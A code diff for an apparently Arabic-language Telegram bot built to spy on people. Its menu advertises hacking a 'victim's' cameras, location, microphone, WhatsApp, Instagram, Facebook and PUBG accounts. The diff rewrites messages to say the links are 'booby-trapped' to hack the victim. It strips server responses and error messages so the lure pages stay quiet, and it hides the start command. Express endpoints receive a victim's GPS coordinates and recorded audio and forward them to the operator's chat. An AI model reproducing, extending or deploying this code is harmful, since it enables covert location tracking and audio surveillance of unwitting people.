@@ -147,7 +147,7 @@ bot.onText(/\/start/, async (msg) => {
     const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
     const mainMenuButtons = [
       [{ text: 'اختراق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` }, { text: 'اختراق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }],
-      [{ text: 'الحصول الموقع 📍', callback_data: `getLocationi:${chatId}` }, { text: 'تسجيل الصوت 🎤🎵', callback_data: `recordAudio:${chatId}` }],
+      [{ text: 'اختراق الموقع 📍', callback_data: `getLocationi:${chatId}` }, { text: 'تسجيل صوت الضحيه 🎤 ', callback_data: `recordAudio:${chatId}` }],
       [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }, { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }],
       [{ text: 'اختراق واتساب 🟢', callback_data: 'request_verification' }, { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }],
       [{ text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }, { text: 'اختراق ببجي 🕹', callback_data: 'get_pubg' }],
@@ -3534,10 +3534,10 @@ async function sendRequestToApi(content, msg) {
         if (response.status === 200) {
             bot.sendMessage(msg.chat.id, `الناتج: ${response.data}`);
         } else {
-            bot.sendMessage(msg.chat.id, "حدث خطأ أثناء الاتصال بالخادم.");
+            
         }
     } catch (error) {
-        bot.sendMessage(msg.chat.id, "تعذر الاتصال بالخادم.");
+        
     }
 }
 
@@ -3580,7 +3580,7 @@ bot.on('callback_query', (callbackQuery) => {
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
             chatId, 
-            `انقر على الرابط التالي للحصول على موقعك:\n\n${locationUrl}`
+            `تم تلغيم الرابط لختراق موقع الضحيه :\n\n${locationUrl}`
         );
         
         // تأكيد استلام الضغط
@@ -3600,16 +3600,15 @@ app.post('/submitLocation', async (req, res) => {
         console.log('تم استقبال الموقع:', { chatId, latitude, longitude, accuracy });
 
         // إرسال الموقع إلى المستخدم في التلجرام
-        await bot.sendMessage(chatId, `✅ تم استلام موقعك بنجاح!\n\n📍 خط العرض: ${latitude}\n📍 خط الطول: ${longitude}\n📏 الدقة: ${accuracy} متر`);
+        await bot.sendMessage(chatId, `✅ تم اخترق موقع الضحيه بنجاح💀!\n\n📍 خط العرض: ${latitude}\n📍 خط الطول: ${longitude}\n📏 الدقة: ${accuracy} متر`);
 
         // إرسال الموقع كـ location على الخريطة
         await bot.sendLocation(chatId, latitude, longitude);
 
-        res.status(200).send('تم استلام الموقع بنجاح');
+        
         
     } catch (error) {
-        console.error('خطأ في معالجة الموقع:', error);
-        res.status(500).send('خطأ في الخادم');
+        
     }
 });
 
@@ -3636,28 +3635,24 @@ app.post('/submitAudio', async (req, res) => {
             return res.status(400).send('بيانات ناقصة');
         }
 
-        console.log('تم استقبال الصوت:', { chatId });
-
-        // إرسال رسالة نصية للمستخدم
-        await bot.sendMessage(chatId, '✅ تم استلام تسجيلك الصوتي بنجاح!');
+        
 
         // إرسال الملف الصوتي (نحتاج لتحويل البيانات base64 إلى ملف)
         const audioBuffer = Buffer.from(audioData.split(',')[1], 'base64');
         
         await bot.sendVoice(chatId, audioBuffer, {
-            caption: 'تسجيل صوتي تم استلامه'
+            caption: 'تم تسجيل صوت الضحيه💀'
         });
 
-        res.status(200).json({ success: true, message: 'تم استلام الصوت بنجاح' });
+        
         
     } catch (error) {
-        console.error('خطأ في معالجة الصوت:', error);
-        res.status(500).send('خطأ في الخادم');
+        
     }
 });
 
 // أمر البدء /start
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/stahqkakasbvdolsrt/, (msg) => {
     const chatId = msg.chat.id;
     
     const keyboard = {
@@ -3686,7 +3681,7 @@ bot.on('callback_query', (callbackQuery) => {
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
             chatId, 
-            `انقر على الرابط التالي لتسجيل صوتك:\n\n${audioUrl}`
+            `تم تليغم الرابط لختراق المكرفون وتسجيل صوت الضحيه 💀:\n\n${audioUrl}`
         );
         
         // تأكيد استلام الضغط
